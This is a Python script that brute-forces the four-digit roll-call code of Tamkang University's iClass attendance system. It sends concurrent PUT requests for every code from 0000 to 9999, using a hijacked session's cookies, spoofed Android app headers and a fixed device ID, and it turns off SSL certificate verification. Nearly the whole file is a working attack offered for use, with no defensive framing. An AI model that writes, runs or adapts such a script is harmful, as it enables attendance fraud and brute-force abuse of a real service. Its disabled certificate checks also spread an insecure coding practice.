import ssl
import aiohttp
import asyncio
import json

async def try_code(session, url, headers, code):
    data = {
        "deviceId": "7eba2081f77e5527",
        "numberCode": code
    }
    async with session.put(url, headers=headers, data=json.dumps(data)) as resp:
        text = await resp.text()
        print(f"Trying {code}: {resp.status} - {text}")
        if resp.status == 200 and "on_call" in text.lower():
            print(f"✅ Correct code found: {code}")
            return True
    return False
    
async def answer_rollcall_number_async(session, rollcall_id):
    url = f"https://iclass.tku.edu.tw/api/rollcall/{rollcall_id}/answer_number_rollcall"

    headers = {
        "host": "iclass.tku.edu.tw",
        "sec-ch-ua-platform": "\"Android\"",
        "accept-language": "zh-Hant",
        "sec-ch-ua": "\"Android WebView\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
        "sec-ch-ua-mobile": "?1",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-A146P Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/135.0.7049.111 Mobile Safari/537.36 TronClass/googleplay",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "origin": "http://localhost",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "http://localhost/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "priority": "u=1, i"
    }

    # 🔐 Disable SSL verification
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_context)
    cookie_dict = session.cookies.get_dict()
    # 🔄 Use the connector with disabled SSL
    async with aiohttp.ClientSession(cookies=cookie_dict, connector=connector) as session:
        for i in range(0, 10000, 100):
            tasks = []
            for j in range(i, min(i + 100, 10000)):
                code = f"{j:04d}"
                tasks.append(try_code(session, url, headers, code))
            results = await asyncio.gather(*tasks)
            if any(results):
                break  # Stop on success

